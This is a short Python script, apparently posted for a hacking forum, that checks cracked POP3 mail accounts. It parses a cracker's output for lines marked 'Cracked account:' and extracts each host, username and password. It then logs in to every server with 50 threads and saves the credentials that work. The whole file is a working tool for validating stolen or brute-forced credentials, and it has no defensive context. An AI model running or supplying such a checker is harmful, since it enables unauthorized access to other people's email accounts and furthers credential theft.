#! /usr/bin/env python3.1
# 12.01.2010 <> 12.01.2010 | cmiN
# POP3 checker 4 Flubber @ rstcenter.com


import threading, poplib


class MSender(threading.Thread):

    ipl = list()
    verbose = 1

    def __init__(self, ip, usr, pwd):
        threading.Thread.__init__(self)
        self.ip = ip
        self.usr = usr
        self.pwd = pwd

    def run(self):
        try:
            psock = poplib.POP3(self.ip)
            psock.user(self.usr)
            psock.pass_(self.pwd)
            psock.getwelcome()
            psock.quit()
        except Exception as message:
            if MSender.verbose:
                print(self.ip, self.usr, self.pwd, message)
        else:
            MSender.ipl.append("{} {} {}\n".format(self.ip, self.usr, self.pwd))
        

def main():
    ifname = "input.txt"
    ofname = "output.txt"
    olname = "hosts.txt"
    word = b"Cracked account:"
    threads = 50
    print("[1] Finding and writing cracked hosts...")
    with open(ifname, "rb") as fin, open(ofname, "wt") as fout:
        for line in fin:
            if line.count(word) == 1:
                ip = line[:line.index(b"@")].decode()
                chunk = line[line.index(word) + len(word):]
                chunk = chunk.decode().strip("\n").strip("\r").strip(" ")
                usr = chunk.split("/")[0]
                pwd = chunk.split("/")[1]
                final = "{} {} {}\n".format(ip, usr, pwd)
                fout.write(final)
    print("[1] Finished.")
    print("[2] Testing and saving working hosts...")
    with open(ofname, "rt") as fin:
        for line in fin:
            line = line.strip("\n").split(" ")
            while threading.active_count() > threads:
                pass
            MSender(line[0], line[1], line[2]).start()
    while threading.active_count() > 1:
        pass
    with open(olname, "wt") as fout:
        for x in MSender.ipl:
            fout.write(x)
    print("[2] Finished.")


if __name__ == "__main__":
    main()
